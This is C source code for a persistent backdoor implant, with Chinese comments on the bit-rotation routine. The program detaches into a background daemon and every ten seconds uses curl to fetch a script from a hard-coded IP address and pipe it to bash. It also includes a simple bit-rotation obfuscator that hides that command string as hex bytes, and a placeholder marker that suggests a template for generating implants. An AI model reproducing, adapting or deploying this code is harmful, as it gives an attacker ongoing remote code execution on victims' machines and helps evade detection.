#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <sys/param.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdlib.h>

char curl_https[] = "curl -k https://11.22.33.44:18000/task10557089e37ed1f0ecfbfd042974/task/task.txt|bash";

void d3obfu3c4t0r(uint8_t *data, int len)
{
    for (int i = 0; i < len; i++) {
        data[i] = shiftme(data[i], -1);
    }
}

uint8_t shiftme(uint8_t value, int8_t n)
{
    uint8_t z;
    if (n > 0 && n < 8)
    {
        z = (value >> (8 - n)) | (value << n);    /*循环左移的实现过程*/
    }
    else if (n > -8 && n < 0)
    {
        n = -n;
        z = (value << (8 - n)) | (value >> n);  /*循环右移的实现过程*/
    }
    return z;
}

void obfu3c4t0r(uint8_t *data, int len)
{
    for (int i = 0; i < len; i++) {
        data[i] = shiftme(data[i], 1);
    }
}

void obfu3c4t0r_me()
{
    obfu3c4t0r(curl_https,sizeof(curl_https));
    // start
    printf("uint8_t curl_https[]=\"");
    for(int i=0;i<sizeof(curl_https);i++){
        printf("\\x%02x",(uint8_t)curl_https[i]);
    }
    printf("\";\n");
    // end
    d3obfu3c4t0r(curl_https,sizeof(curl_https));
    printf("%s\n",curl_https);
    exit(0);
}

void init_daemon(void) {   
    int pid;
    int i;
    if(pid=fork()) {
        exit(0);
    }else if(pid< 0) {
        exit(1);
    }
    setsid();
    if(pid=fork()) {
        exit(0);
    }else if(pid< 0) {
        exit(1);
    }
    for(i=0;i< NOFILE;++i) {
        close(i);
    }
    chdir("/tmp");
    umask(0);
    return;
}

void do_task(){
    d3obfu3c4t0r(curl_https,sizeof(curl_https));
    FILE *fp=popen(curl_https,"r");
    pclose(fp);
}

int main()
{
    char a[50]="<!REPLACEXME!>";
    
    //[+] delete me
    //obfu3c4t0r_me();
    //[-] delete me
    
    init_daemon();
    while(1)  
    {
        sleep(10); 
        do_task();
    }
    return 0;
}